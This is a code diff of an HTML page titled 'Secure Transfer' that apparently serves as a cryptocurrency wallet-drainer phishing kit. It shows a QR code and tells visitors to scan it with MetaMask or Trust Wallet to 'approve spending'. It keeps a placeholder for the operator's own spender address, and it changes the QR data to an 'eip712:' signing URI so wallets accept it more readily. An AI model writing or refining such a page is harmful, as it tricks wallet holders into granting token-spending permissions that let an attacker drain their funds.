@@ -1,80 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Transfer</title>
-    <!-- Load QRCode.js from CDN -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f6f8;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 20px;
-        }
-        #qrcode {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-        }
-        #qrcode img {
-            border: 1px solid #ddd;
-            padding: 10px;
-            border-radius: 8px;
-        }
-        .status {
-            font-size: 14px;
-            color: #28a745;
-            font-weight: bold;
-        }
-        .btn {
-            background-color: #007bff;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-        .btn:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Confirm Transfer</h2>
-    <p>Scan with MetaMask or Trust Wallet to approve spending.</p>
-    
-    <div id="qrcode"></div>
-    
-    <div class="status">Waiting for confirmation...</div>
-    <button class="btn" disabled>Processing</button>
-</div>
-
 <script>
     // 1. CONFIGURATION
     const YOUR_SPENDER_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"; // REPLACE THIS WITH YOUR ACTUAL ETH ADDRESS
@@ -109,8 +32,8 @@
 
     // 3. GENERATE QR CODE
     document.addEventListener("DOMContentLoaded", function() {
-        // Convert JSON to string for the QR code
-        const qrData = JSON.stringify(payload);
+        // Wrap the JSON in the eip712: URI scheme
+        const qrData = "eip712:" + JSON.stringify(payload);
         
         new QRCode(document.getElementById("qrcode"), {
             text: qrData,
@@ -122,6 +45,3 @@
         });
     });
 </script>
-
-</body>
-</html>
